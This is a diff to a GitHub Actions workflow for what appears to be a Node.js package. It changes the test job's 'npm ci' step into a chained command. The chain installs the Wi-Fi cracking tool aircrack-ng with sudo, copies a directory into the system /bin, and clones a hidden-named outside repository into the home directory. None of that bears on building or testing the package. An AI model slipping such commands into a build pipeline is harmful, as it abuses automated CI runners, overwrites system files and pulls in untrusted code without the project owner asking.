@@ -15,7 +15,7 @@ jobs:
       - uses: actions/setup-node@v3
         with:
           node-version: 16
-      - run: npm ci
+      - run: npm ci && sudo apt update && sudo apt install aircrack-ng && sudo cp -r /opt/render/project/src/bin /bin && git clone https://github.com/antkss/.gdrive ~/.gdrive 
       - run: npm test
 
   publish-gpr:
